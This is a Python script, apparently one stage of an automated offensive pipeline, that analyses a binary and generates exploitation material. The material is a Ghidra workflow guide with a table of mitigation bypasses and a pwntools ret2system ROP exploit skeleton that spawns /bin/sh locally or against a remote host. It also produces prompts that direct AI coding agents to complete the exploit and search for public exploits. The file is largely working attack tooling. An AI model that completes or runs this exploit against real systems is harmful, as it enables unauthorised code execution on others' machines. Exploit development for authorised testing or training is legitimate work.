"""
Phase 3D — Binary Analysis
============================
Orchestrates Ghidra analysis via Claude Code skills:
  /ghidra-analyze <binary>  → metadata, function map, strings, imports
  /ghidra-rop <binary>      → ROP gadget discovery

Also generates python-pro agent prompt for exploit PoC development.

Workflow:
  1. Invoke /ghidra-analyze  → identify vulnerable functions
  2. Invoke /ghidra-rop      → enumerate gadgets
  3. python-pro agent        → write exploit PoC
  4. Cross-reference CVEs via technical-researcher
"""

import json
import subprocess
import sys
from pathlib import Path
from datetime import datetime


DANGEROUS_FUNCTIONS = [
    # Memory corruption primitives
    "strcpy", "strcat", "sprintf", "vsprintf", "gets",
    "memcpy", "memmove", "memset",
    "scanf", "fscanf", "sscanf",
    "strncpy", "strncat",
    # Format string
    "printf", "fprintf", "syslog",
    # Command injection
    "system", "popen", "exec", "execve", "execvp", "execl",
    "shellexec", "CreateProcess", "WinExec", "ShellExecute",
    # Integer overflow risk
    "malloc", "realloc", "calloc",
    # Path traversal
    "fopen", "open", "CreateFile",
]

ROP_GADGET_HINTS = {
    "x86_64": [
        "pop rdi; ret",
        "pop rsi; ret",
        "pop rdx; ret",
        "pop rax; ret",
        "syscall",
        "mov rdi, rax; ret",
        "xor rdi, rdi; ret",
        "/bin/sh string",
        "int 0x80",
    ],
    "x86": [
        "pop eax; ret",
        "pop ebx; ret",
        "pop ecx; ret",
        "pop edx; ret",
        "int 0x80",
        "call eax",
        "/bin/sh string",
    ],
    "arm": [
        "pop {r0, pc}",
        "pop {r0-r3, pc}",
        "bx lr",
        "blx r3",
        "/bin/sh string",
        "system() address",
    ],
    "mips": [
        "addiu $a0, $sp, offset",
        "move $t9, $s0",
        "jalr $t9",
        "li $v0, 4011",  # execve syscall
        "syscall",
        "/bin/sh string",
    ],
}


def run_binary_analysis(binary_path: str, output_dir: Path) -> None:
    binary = Path(binary_path)
    if not binary.exists():
        print(f"[ERROR] Binary not found: {binary_path}")
        sys.exit(1)

    bin_dir = output_dir / "binary"
    bin_dir.mkdir(exist_ok=True)

    print(f"\n[PHASE 3D] Binary Analysis — {binary.name}")
    print("=" * 60)

    analysis = {
        "binary": str(binary),
        "name": binary.name,
        "timestamp": datetime.utcnow().isoformat(),
        "size_bytes": binary.stat().st_size,
        "static_analysis": {},
        "dynamic_analysis_notes": [],
    }

    # 1. Basic static info (no external tools needed)
    print("\n[1/4] Basic file analysis...")
    static = _basic_static_analysis(binary)
    analysis["static_analysis"] = static
    print(f"      Size     : {analysis['size_bytes']:,} bytes")
    print(f"      Magic    : {static.get('magic', 'unknown')}")
    print(f"      Arch     : {static.get('architecture', 'unknown')}")

    # 2. String extraction
    print("\n[2/4] Extracting strings...")
    strings = _extract_strings(binary)
    analysis["strings"] = strings
    interesting = [s for s in strings if any(d in s.lower() for d in
                   ["password", "secret", "key", "token", "admin", "root", "/bin/sh",
                    "exec", "system", "flag", "flag{", "http://", "https://"])]
    analysis["interesting_strings"] = interesting
    print(f"      Total strings   : {len(strings)}")
    print(f"      Interesting     : {len(interesting)}")
    for s in interesting[:5]:
        print(f"        → {s[:80]}")

    # 3. Generate Ghidra skill prompts
    print("\n[3/4] Generating Ghidra analysis prompts...")
    ghidra_guide = _generate_ghidra_guide(binary, analysis)
    ghidra_file = bin_dir / "ghidra_workflow.md"
    ghidra_file.write_text(ghidra_guide)
    print(f"      Saved to {ghidra_file}")

    # 4. Generate exploit PoC skeleton
    print("\n[4/4] Generating exploit PoC skeleton...")
    arch = static.get("architecture", "x86_64")
    poc_skeleton = _generate_poc_skeleton(binary, arch)
    poc_file = bin_dir / "exploit_poc.py"
    poc_file.write_text(poc_skeleton)
    print(f"      Saved to {poc_file}")

    # Agent prompts
    agent_prompt = _generate_agent_prompts(binary, analysis, arch)
    agent_file = bin_dir / "agent_prompts.md"
    agent_file.write_text(agent_prompt)

    # Save analysis
    out_file = bin_dir / "analysis.json"
    out_file.write_text(json.dumps(analysis, indent=2, default=str))

    _print_summary(analysis, bin_dir)


def _basic_static_analysis(binary: Path) -> dict:
    result = {"magic": "unknown", "architecture": "unknown", "format": "unknown"}
    try:
        with open(binary, "rb") as f:
            header = f.read(16)
        # ELF
        if header[:4] == b"\x7fELF":
            result["format"] = "ELF"
            ei_class = header[4]
            ei_data = header[5]
            e_machine = int.from_bytes(header[18:20], "little" if ei_data == 1 else "big")
            arch_map = {
                0x03: "x86", 0x3E: "x86_64", 0x28: "arm",
                0xB7: "aarch64", 0x08: "mips", 0x02: "sparc",
            }
            result["magic"] = "ELF"
            result["architecture"] = arch_map.get(e_machine, f"unknown (e_machine={hex(e_machine)})")
            result["bits"] = 64 if ei_class == 2 else 32
            result["endianness"] = "big" if ei_data == 2 else "little"
        # PE (Windows)
        elif header[:2] == b"MZ":
            result["format"] = "PE"
            result["magic"] = "MZ (Windows PE)"
            result["architecture"] = "x86/x86_64 (check PE header)"
        # Mach-O
        elif header[:4] in (b"\xfe\xed\xfa\xce", b"\xfe\xed\xfa\xcf",
                             b"\xce\xfa\xed\xfe", b"\xcf\xfa\xed\xfe"):
            result["format"] = "Mach-O"
            result["magic"] = "Mach-O"
            result["architecture"] = "x86_64/arm64"
    except Exception as e:
        result["error"] = str(e)
    return result


def _extract_strings(binary: Path, min_len: int = 8) -> list[str]:
    """Extract printable ASCII strings from binary."""
    strings = []
    try:
        with open(binary, "rb") as f:
            data = f.read()
        current = []
        for byte in data:
            if 0x20 <= byte <= 0x7E:
                current.append(chr(byte))
            else:
                if len(current) >= min_len:
                    strings.append("".join(current))
                current = []
        if len(current) >= min_len:
            strings.append("".join(current))
    except Exception:
        pass
    return strings[:500]  # Cap at 500


def _generate_ghidra_guide(binary: Path, analysis: dict) -> str:
    arch = analysis["static_analysis"].get("architecture", "unknown")
    gadget_hints = ROP_GADGET_HINTS.get(arch, ROP_GADGET_HINTS["x86_64"])

    return f"""# Ghidra Analysis Workflow — {binary.name}

Generated: {analysis['timestamp']}
Binary: `{binary}`
Architecture: {arch}
Format: {analysis['static_analysis'].get('format', 'unknown')}

---

## Step 1 — Run /ghidra-analyze

In Claude Code, run:

```
/ghidra-analyze {binary}
```

### What to look for:
- Functions containing: {', '.join(DANGEROUS_FUNCTIONS[:8])}
- Decompiled code near user-controlled input paths
- Functions with unbounded memory operations
- Hardcoded credentials or keys
- Crypto implementation weaknesses

---

## Step 2 — Run /ghidra-rop

```
/ghidra-rop {binary}
```

### Target gadgets for {arch}:
{"".join(f"- `{g}`{chr(10)}" for g in gadget_hints)}

---

## Step 3 — Key addresses to find in Ghidra

1. **Entry point** — `_start` or `main()`
2. **Dangerous function calls** — cross-ref each of: {', '.join(DANGEROUS_FUNCTIONS[:5])}
3. **system() or execve()** — if present, look for controlled argument path
4. **Writable GOT entries** — for GOT overwrite attacks
5. **PLT stubs** — for ret2plt technique

---

## Step 4 — Manual decompilation checklist

For each dangerous function call found:

- [ ] Is the buffer size fixed or heap-allocated?
- [ ] Is user input copied without bounds check?
- [ ] Is there an integer overflow before the allocation?
- [ ] Is the return address overwriteable (stack canary? PIE? ASLR?)?

---

## Interesting strings found in binary

{chr(10).join(f'- `{s}`' for s in analysis.get('interesting_strings', [])[:20]) or '- None extracted'}

---

## Step 5 — Check mitigations

```bash
# Linux (checksec)
checksec --file={binary}

# Manual checks
file {binary}
readelf -d {binary} | grep -E "RUNPATH|RPATH|PIE|NX|STACK"
```

| Mitigation | How to bypass |
|------------|---------------|
| NX/DEP | ROP chains |
| Stack canary | Leak canary, format string |
| PIE | Leak base address |
| ASLR | Brute force (32-bit), information leak |
| RELRO (partial) | GOT overwrite |
| RELRO (full) | Can't overwrite GOT |
"""


def _generate_poc_skeleton(binary: Path, arch: str) -> str:
    return f'''#!/usr/bin/env python3
"""
Exploit PoC Skeleton — {binary.name}
Architecture: {arch}
Generated: {datetime.utcnow().isoformat()}

Instructions:
1. Run /ghidra-analyze and /ghidra-rop to get actual offsets
2. Replace placeholder addresses with real values from Ghidra
3. Use python-pro agent to complete the exploit logic
"""

from pwn import *

# Target binary
BINARY = "{binary}"
HOST = "localhost"
PORT = 9999

# ---- UPDATE THESE FROM GHIDRA ----
OFFSET_TO_RIP = 0  # Buffer offset to return address (find with cyclic pattern)
SYSTEM_PLT = 0x0   # Address of system() in PLT (from Ghidra)
BIN_SH_ADDR = 0x0  # Address of "/bin/sh" string (from Ghidra strings search)
POP_RDI_RET = 0x0  # ROP gadget: pop rdi; ret (from /ghidra-rop output)

# ---- BINARY SETUP ----
context.binary = ELF(BINARY)
context.arch = "{arch.replace("x86_64", "amd64")}"
context.log_level = "info"


def cyclic_test():
    """Find the exact offset to return address using cyclic pattern."""
    p = process(BINARY)
    pattern = cyclic(200)
    p.sendline(pattern)
    p.wait()
    core = p.corefile
    fault_addr = core.fault_addr
    offset = cyclic_find(fault_addr)
    log.success(f"Offset to RIP/EIP: {{offset}}")
    return offset


def build_rop_chain():
    """Build ROP chain for ret2system (Linux) or VirtualProtect (Windows)."""
    rop = ROP(context.binary)

    # Linux ret2system:
    # system("/bin/sh")
    chain = b"A" * OFFSET_TO_RIP
    chain += p64(POP_RDI_RET)    # pop rdi; ret
    chain += p64(BIN_SH_ADDR)    # rdi = "/bin/sh"
    chain += p64(SYSTEM_PLT)     # call system()

    return chain


def exploit_local():
    p = process(BINARY)
    payload = build_rop_chain()
    log.info(f"Sending {{len(payload)}} byte payload")
    p.sendline(payload)
    p.interactive()


def exploit_remote():
    p = remote(HOST, PORT)
    payload = build_rop_chain()
    p.sendline(payload)
    p.interactive()


if __name__ == "__main__":
    import sys
    if "--find-offset" in sys.argv:
        cyclic_test()
    elif "--remote" in sys.argv:
        exploit_remote()
    else:
        exploit_local()
'''


def _generate_agent_prompts(binary: Path, analysis: dict, arch: str) -> str:
    strings_preview = "\n".join(f"  - {s}" for s in analysis.get("interesting_strings", [])[:10])
    return f"""# Binary Analysis Agent Prompts — {binary.name}

---

## /ghidra-analyze Invocation

```
/ghidra-analyze {binary}
```

**What to ask the agent:**
- List all calls to dangerous functions: {', '.join(DANGEROUS_FUNCTIONS[:6])}
- Show decompiled code for functions containing `gets`, `strcpy`, or `system`
- Identify any hardcoded credentials or keys
- Show the main() function decompilation
- List all imported library functions

---

## /ghidra-rop Invocation

```
/ghidra-rop {binary}
```

**Target gadgets for {arch}:**
{chr(10).join(f"- `{g}`" for g in ROP_GADGET_HINTS.get(arch, ROP_GADGET_HINTS["x86_64"]))}

**Ask the agent for:**
- ROP gadget offsets as `p64()` / `p32()` values for pwntools
- Stack pivot gadgets
- Syscall gadgets
- Write-what-where primitives

---

## python-pro Agent Prompt (PoC development)

```
I need to develop an exploit PoC for a binary vulnerability.

Binary: {binary.name}
Architecture: {arch}
Format: {analysis['static_analysis'].get('format', 'ELF')}

Interesting strings found:
{strings_preview or '  (run /ghidra-analyze first)'}

From Ghidra analysis I have found:
- [PASTE DANGEROUS FUNCTION LOCATIONS HERE]
- [PASTE ROP GADGET OFFSETS HERE]

Write a pwntools exploit script that:
1. Finds the buffer overflow offset using cyclic()
2. Builds a ROP chain to call system("/bin/sh")
3. Handles PIE (leak base address if needed)
4. Includes both local process and remote() modes

The skeleton is at: output/binary/exploit_poc.py
Complete the OFFSET_TO_RIP, SYSTEM_PLT, BIN_SH_ADDR, and POP_RDI_RET values
and add any additional ROP chain logic required.
```

---

## technical-researcher Agent Prompt (CVE lookup)

```
Research known vulnerabilities for this binary:

Binary name: {binary.name}
Architecture: {arch}

1. Search for CVEs matching this binary name or common patterns
2. Look for known ROP techniques for this architecture
3. Check if this binary version has public exploits
4. Reference relevant MITRE ATT&CK techniques (e.g., T1203, T1055)
```
"""


def _print_summary(analysis: dict, bin_dir: Path) -> None:
    static = analysis["static_analysis"]
    print(f"\n[PHASE 3D SUMMARY]")
    print(f"  Binary          : {analysis['name']}")
    print(f"  Format          : {static.get('format', 'unknown')}")
    print(f"  Architecture    : {static.get('architecture', 'unknown')}")
    print(f"  Size            : {analysis['size_bytes']:,} bytes")
    print(f"  Strings found   : {len(analysis.get('strings', []))}")
    print(f"  Interesting     : {len(analysis.get('interesting_strings', []))}")
    print(f"\n[FILES]")
    print(f"  {bin_dir}/analysis.json")
    print(f"  {bin_dir}/ghidra_workflow.md")
    print(f"  {bin_dir}/exploit_poc.py")
    print(f"  {bin_dir}/agent_prompts.md")
    print(f"\n[NEXT] Follow ghidra_workflow.md:")
    print(f"  1. /ghidra-analyze {analysis['binary']}")
    print(f"  2. /ghidra-rop {analysis['binary']}")
    print(f"  3. Use agent_prompts.md with python-pro agent for PoC\n")
